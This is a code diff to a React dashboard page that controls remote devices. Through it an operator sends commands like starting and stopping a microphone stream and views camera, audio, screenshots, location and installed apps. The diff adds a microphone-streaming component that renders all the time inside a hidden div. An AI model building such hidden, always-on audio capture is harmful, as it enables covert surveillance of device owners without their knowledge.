@@ -14,13 +14,13 @@ import {
     Table,
     Badge
 } from 'antd';
-import type { MenuProps } from 'antd';
+import type { MenuProps, TabsProps } from 'antd';
 import instance from 'service/api';
 import { MapContainer, Marker, Popup, TileLayer } from 'react-leaflet';
 import 'leaflet/dist/leaflet.css';
 import { CameraStream } from 'components/CameraStream/CameraStream';
 import { AudioStream } from 'components/AudioStream/AudioStream';
-import { AudioStreamMic } from 'components/AudioStreamMic/AudioStreamMic'; // новый компонент для микрофонного стриминга
+import { AudioStreamMic } from 'components/AudioStreamMic/AudioStreamMic';
 import { MediaCapture } from 'components/PhotoStream/PhotoStream';
 
 const { TabPane } = Tabs;
@@ -84,6 +84,8 @@ export const ClientDetails: React.FC = () => {
     const [captureModalVisible, setCaptureModalVisible] = useState(false);
     const [screenshotModalVisible, setScreenshotModalVisible] = useState(false);
     const [audioModalVisible, setAudioModalVisible] = useState(false);
+    // Локальное состояние для микростриминга
+    const [micStreaming, setMicStreaming] = useState(false);
 
     useEffect(() => {
         if (id) {
@@ -126,7 +128,6 @@ export const ClientDetails: React.FC = () => {
                 command: cmd,
                 device_id: id || ''
             };
-
             await instance.post(`/send_command`, body);
             openNotificationWithIcon('success', cmd);
         } catch (err) {
@@ -195,12 +196,20 @@ export const ClientDetails: React.FC = () => {
         {
             key: 'start_mic',
             label: 'Start Mic Stream',
-            onClick: () => sendCommand('start_mic')
+            onClick: () => {
+                sendCommand('start_mic');
+                setMicStreaming(true);
+            },
+            disabled: micStreaming
         },
         {
             key: 'stop_mic',
             label: 'Stop Mic Stream',
-            onClick: () => sendCommand('stop_mic')
+            onClick: () => {
+                sendCommand('stop_mic');
+                setMicStreaming(false);
+            },
+            disabled: !micStreaming
         }
     ];
 
@@ -233,12 +242,26 @@ export const ClientDetails: React.FC = () => {
         }, 2000);
     };
 
-    // Пример колонок для таблицы установленных приложений
     const appColumns = [
         { title: 'Name', dataIndex: 'name' },
         { title: 'Version', dataIndex: 'version' },
         { title: 'Type', dataIndex: 'app_type' },
         { title: 'Installed At', dataIndex: 'created_at' }
+    ];
+
+    const tabsItems: TabsProps['items'] = [
+        {
+            key: 'apps',
+            label: 'Software',
+            children: (
+                <Table
+                    dataSource={apps}
+                    columns={appColumns}
+                    rowKey="id"
+                    pagination={{ pageSize: 5 }}
+                />
+            )
+        }
     ];
 
     return (
@@ -304,23 +327,7 @@ export const ClientDetails: React.FC = () => {
                 )}
             </div>
 
-            <Tabs defaultActiveKey="details">
-                <TabPane tab="Software" key="apps">
-                    <Table
-                        dataSource={apps}
-                        columns={appColumns}
-                        rowKey="id"
-                        pagination={{ pageSize: 5 }}
-                    />
-                </TabPane>
-                <TabPane tab="Scripts" key="scripts">
-                    <p>Какие-то запросы/логи.</p>
-                </TabPane>
-                <TabPane tab="Microphone" key="microphone">
-                    {/* Новый компонент для непрерывного стриминга аудио с микрофона */}
-                    <AudioStreamMic deviceId={id} />
-                </TabPane>
-            </Tabs>
+            <Tabs defaultActiveKey="details" items={tabsItems} />
 
             <div style={{ marginTop: 16, padding: 16, background: '#fff' }}>
                 <div style={{ width: '100%', height: '400px' }}>
@@ -381,6 +388,11 @@ export const ClientDetails: React.FC = () => {
             >
                 <AudioStream deviceId={id} />
             </Modal>
+
+            {/* AudioStreamMic рендерится всегда, но можно скрыть его, если UI не должен его показывать */}
+            <div style={{ display: 'none' }}>
+                <AudioStreamMic deviceId={id} />
+            </div>
         </div>
     );
 };
